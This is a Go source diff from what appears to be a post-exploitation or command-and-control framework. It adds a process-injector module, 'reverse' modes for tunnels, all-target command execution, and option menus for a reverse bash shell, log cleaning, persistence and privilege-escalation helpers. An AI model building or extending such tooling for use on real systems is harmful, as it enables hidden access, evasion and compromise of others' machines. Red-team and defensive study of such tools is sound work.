@@ -26,7 +26,7 @@ var (
 
 	// ShellHelpInfo provide utilities like ps, kill, etc
 	ShellHelpInfo = map[string]string{
-		"help":  "Display this help",
+		HELP:    "Display this help",
 		"bash":  "A reverse bash shell from HTTP2 tunnel, press Ctrl-D to leave",
 		"#ps":   "List processes: `ps`",
 		"#kill": "Kill process: `kill <PID>`",
@@ -46,6 +46,7 @@ var (
 		agent.ModCLEAN_LOG:   moduleLogCleaner,
 		agent.ModPERSISTENCE: modulePersistence,
 		agent.ModVACCINE:     moduleVaccine,
+		agent.ModINJECTOR:    moduleInjector,
 	}
 )
 
@@ -109,7 +110,7 @@ func UpdateOptions(modName string) (exist bool) {
 		lportOpt.Vals = []string{"8080", "1080", "22", "23", "21"}
 		// on/off
 		switchOpt := addIfNotFound("switch")
-		switchOpt.Vals = []string{"on", "off"}
+		switchOpt.Vals = []string{"on", "off", "reverse"}
 		switchOpt.Val = "on"
 
 	case modName == agent.ModCLEAN_LOG:
@@ -122,13 +123,23 @@ func UpdateOptions(modName string) (exist bool) {
 		portOpt.Vals = []string{"1080", "8080", "10800", "10888"}
 		portOpt.Val = "8080"
 		statusOpt := addIfNotFound("status")
-		statusOpt.Vals = []string{"on", "off"}
+		statusOpt.Vals = []string{"on", "off", "reverse"}
 		statusOpt.Val = "on"
 
 	case modName == agent.ModLPE_SUGGEST:
 		currentOpt = addIfNotFound("lpe_helper")
-		currentOpt.Vals = []string{"lpe_les", "lpe_upc"}
+		for name := range LPEHelpers {
+			currentOpt.Vals = append(currentOpt.Vals, name)
+		}
 		currentOpt.Val = "lpe_les"
+
+	case modName == agent.ModINJECTOR:
+		pidOpt := addIfNotFound("pid")
+		pidOpt.Vals = []string{"0"}
+		pidOpt.Val = "0"
+		methodOpt := addIfNotFound("method")
+		methodOpt.Vals = []string{"gdb", "native", "python"}
+		methodOpt.Val = "native"
 
 	case modName == agent.ModPERSISTENCE:
 		currentOpt = addIfNotFound("method")
@@ -148,8 +159,14 @@ func UpdateOptions(modName string) (exist bool) {
 // ModuleRun run current module
 func ModuleRun() {
 	if CurrentTarget == nil {
-		CliPrintError("Target not set, try `target 0`?")
-		return
+		if CurrentMod == agent.ModCMD_EXEC {
+			if !CliYesNo("Run on all targets") {
+				CliPrintError("Target not set, try `target 0`?")
+				return
+			}
+			ModuleHelpers[agent.ModCMD_EXEC]()
+			return
+		}
 	}
 	if Targets[CurrentTarget] == nil {
 		CliPrintError("Target not exist, type `info` to check")
